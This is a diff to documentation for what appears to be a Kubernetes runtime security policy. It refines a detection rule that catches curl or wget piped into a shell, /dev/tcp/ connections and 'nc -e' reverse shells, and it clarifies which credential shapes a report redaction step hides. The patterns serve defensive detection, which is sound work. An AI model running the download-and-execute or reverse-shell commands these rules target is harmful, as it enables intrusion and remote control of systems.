@@ -277,9 +277,12 @@ spec:
     - name: download-and-run-or-reverse-shell
       expression: >-
         event.exec.argv.exists(a,
-          a.matches("(curl|wget)[^|]*\\|\\s*(ba)?sh") ||
+          a.matches("(curl|wget)[^|]*\\|\\s*(\\S*/)?(ba)?sh\\b") ||
           a.contains("/dev/tcp/") ||
-          a.matches("\\bnc\\b.*\\s-e\\s"))
+          a.matches("\\bnc\\s.*\\s-e\\s")) ||
+        (event.exec.argv.size() > 0 &&
+          event.exec.argv[0].matches("(^|/)nc$") &&
+          "-e" in event.exec.argv)
 EOF
 ```
 
@@ -305,8 +308,9 @@ sh -c wget -qO- -T 5 --header "Authorization: REDACTED http://example.com/instal
 ```
 
 The token never reaches the Report. Every value written to a Report passes through a fixed
-redaction step that replaces bearer tokens, API keys, AWS key IDs, JWTs, and prompt payloads,
-and no setting turns it off.
+redaction step that replaces recognized credential shapes — bearer tokens, API keys, AWS key
+IDs, JWTs — and prompt payloads, and no setting turns it off. A credential in another shape,
+such as `curl -u user:password`, is not recognized, so try this with dummy values.
 
 ```bash
 kubectl delete rpol catch-pipe-to-shell
